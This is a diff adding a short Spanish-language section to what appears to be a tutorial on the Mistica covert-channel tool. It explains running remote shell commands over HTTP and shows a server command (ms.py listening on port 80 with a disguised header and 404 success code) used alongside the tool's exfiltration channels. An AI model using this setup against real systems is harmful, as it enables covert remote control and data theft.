@@ -267,3 +267,16 @@ Podemos redirigir la información a un fichero tocando disco.
 
 
 Es una forma creativa para exfiltrar información, utilizando protocolos comunes.
+
+### SHELL
+
+## Shell - HTTP
+
+Podemos ejecutar comandos de manera remota, combinando los módulos shell e io.
+Si queremos ejecutar comandos en el cliente
+
+
+Servidor:
+`python3.8 ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -w "--header User-Agent= --success-code 404" -k key`
+
+![image123.png]({{site.baseurl}}/images/Mistica/image123.png)
